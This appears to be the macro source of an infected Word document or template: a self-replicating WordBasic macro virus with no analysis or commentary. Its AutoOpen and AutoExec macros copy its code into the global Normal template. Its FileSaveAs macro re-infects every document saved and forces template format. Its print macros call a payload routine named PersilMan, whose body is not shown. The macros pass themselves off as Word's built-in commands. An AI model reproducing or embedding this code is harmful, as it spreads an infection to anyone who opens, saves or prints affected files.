   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FilePrintDefault"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Prints the active document using the current defaults"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FilePrintDefault.MAIN"
   WordBasic.Call "PersilMan"
   WordBasic.FilePrintDefault
   End Sub

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   On Error GoTo -1: On Error GoTo Busted

   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   If (dlg.Format = 0) Or (dlg.Format = 1) Then
       WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec", 0
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen", 0
       WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs", 0
       WordBasic.MacroCopy "Global:FilePrint", WordBasic.[WindowName$]() + ":FilePrint", 0
       WordBasic.MacroCopy "Global:FileOpen", WordBasic.[WindowName$]() + ":FileOpen", 0
       WordBasic.MacroCopy "Global:FilePrintDefault", WordBasic.[WindowName$]() + ":FilePrintDefault", 0
       WordBasic.MacroCopy "Global:PersilMan", WordBasic.[WindowName$]() + ":PersilMan", 0
       WordBasic.MacroCopy "Global:ClearKepek", WordBasic.[WindowName$]() + ":ClearKepek", 0
       dlg.Format = 1
   End If
   WordBasic.FileSaveAs dlg
   GoTo EndIt

   Busted:
   Rem If Err <> 102 Then
   Rem     FileSaveAs dlg
   Rem EndIf

   EndIt:
   End Sub

   Attribute VB_Name = "FilePrint"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Prints the active document"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FilePrint.MAIN"
   WordBasic.Call "PersilMan"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
   WordBasic.CurValues.FilePrint dlg
   WordBasic.Dialog.FilePrint dlg
   WordBasic.FilePrint dlg
   End Sub

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Opens an existing document or template"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileOpen.MAIN"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
   WordBasic.CurValues.FileOpen dlg
   WordBasic.Dialog.FileOpen dlg
   WordBasic.FileOpen dlg
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   If IfNotInstalled = 0 Then
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileOpen", "Global:FileOpen", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PersilMan", "Global:PersilMan", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ClearKepek", "Global:ClearKepek", 0
   End If
   WordBasic.Call "ClearKepek"
   End Sub

   Private Function IfNotInstalled()
   Dim i
   Dim CheckInstalled
       IfNotInstalled = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "PersilMan" Then
                   CheckInstalled = 1
               End If
           Next i
       End If
   End Function

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()

   On Error GoTo -1: On Error GoTo Busted
   If IfNotInstalled = 0 Then
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileOpen", "Global:FileOpen", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PersilMan", "Global:PersilMan", 0
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ClearKepek", "Global:ClearKepek", 0
   End If
   WordBasic.Call "ClearKepek"
   GoTo End_The_Pain:
   Busted:
   If Err.Number = 509 Then
       Rem do nothing
   End If
   End_The_Pain:
   End Sub

   Private Function IfNotInstalled()
   Dim i
   Dim CheckInstalled
       IfNotInstalled = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "PersilMan" Then
                   CheckInstalled = 1
               End If
           Next i
       End If
   End Function
